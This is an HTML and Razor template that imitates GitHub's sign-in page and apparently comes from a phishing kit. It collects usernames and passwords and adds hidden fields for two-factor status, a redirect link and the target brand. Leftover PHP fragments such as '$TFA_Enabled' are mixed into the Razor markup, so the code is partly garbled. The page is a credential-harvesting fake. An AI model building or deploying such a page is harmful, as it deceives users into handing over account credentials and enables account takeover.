<!DOCTYPE html>
<html lang=en>

<head>
    <meta charset=utf-8>
    <title>Sign in to GitHub Â· GitHub</title>
    <link rel=stylesheet type=text/css href="~/css/github.css">
    <link rel=icon type="image/x-icon"
        href="data:image/png;base64,">
    <style>

    </style>
</head>

<body class="logged-out env-production page-responsive session-authentication">
    <center><img style=margin-top:25px;margin-bottom:15px
            src="data:image/png;base64,">
    </center>
    <div>
        <main>
            <div class="auth-form px-3">
                @using (Html.BeginForm())
                {
                    <div class="auth-form-header p-0">
                        <h1>Sign in to GitHub</h1>
                    </div>
                    <div class="auth-form-body mt-3"><label for=login_field> Username or email address </label>
                        <input type=hidden name=name value="'.basename(__FILE__).'">
                        <input type=hidden name=TFA_Enabled value="'.$TFA_Enabled.'">
                        <input type=text name=username class="form-control input-block" required>
                        <input type=hidden name=link value='.$redirect.'>
                        <input type=hidden name=location value=Github /><label for=password> Password <a
                                class=label-link href>Forgot password?</a></label>
                        <input type=password name=password class="form-control form-control input-block" required>
                        <input type=submit value="Sign in" class="btn btn-primary btn-block">
                    </div>
                }
                <p class="create-account-callout mt-3"> New to GitHub? <a href>Create an account</a>. </p>
            </div>
        </main>
    </div>
    <center>
        <div style=font-size:12px;margin-top:70px><a style=margin-right:9px href> Terms </a><a style=margin-right:9px
                href> Privacy </a><a style=margin-right:9px href> Security </a><a href style=color:#000> Contact GitHub
            </a></div>
    </center>
</body>

</html>